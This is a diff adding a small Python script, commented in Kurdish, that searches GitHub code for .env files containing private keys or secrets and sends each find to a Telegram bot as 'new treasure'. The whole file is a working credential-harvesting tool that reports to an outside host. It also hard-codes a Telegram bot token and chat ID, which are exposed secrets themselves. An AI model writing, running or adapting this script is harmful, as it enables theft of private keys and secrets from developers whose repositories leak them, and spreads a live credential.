@@ -1,0 +1,43 @@
+import requests
+import os
+import re
+
+# زانیارییەکانت (دڵنیابە وەک خۆیەتی)
+TELEGRAM_TOKEN = "8363879675:AAGOXZfmpGBNUY9DUyUR5DpyaDPcUmYmd50"
+CHAT_ID = "7955490868"
+
+def send_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, data=payload)
+    except:
+        pass
+
+def github_hunter():
+    print("🛰️ Scanning GitHub...")
+    # سێرچێکی گشتی بۆ فایلە حەساسەکان
+    query = 'filename:.env "PRIVATE_KEY" OR "SECRET"'
+    headers = {"Authorization": f"token {os.getenv('GH_TOKEN')}"}
+    
+    url = f"https://api.github.com/search/code?q={query}&sort=indexed"
+    
+    try:
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            for item in data.get('items', [])[:5]:
+                file_url = item['html_url']
+                repo_name = item['repository']['full_name']
+                
+                msg = f"🎯 **گەنجینەیەکی نوێ دۆزرایەوە!**\n\n📦 ڕیپۆ: `{repo_name}`\n🔗 لینک: [کلیک بکە بۆ بینین]({file_url})"
+                send_telegram(msg)
+        elif response.status_code == 401:
+            send_telegram("❌ هەڵە: GH_TOKEN کار ناکات یان سەڵاحیەتەکەی کەمە.")
+        elif response.status_code == 403:
+            print("Rate limit hit. Waiting...")
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    github_hunter()
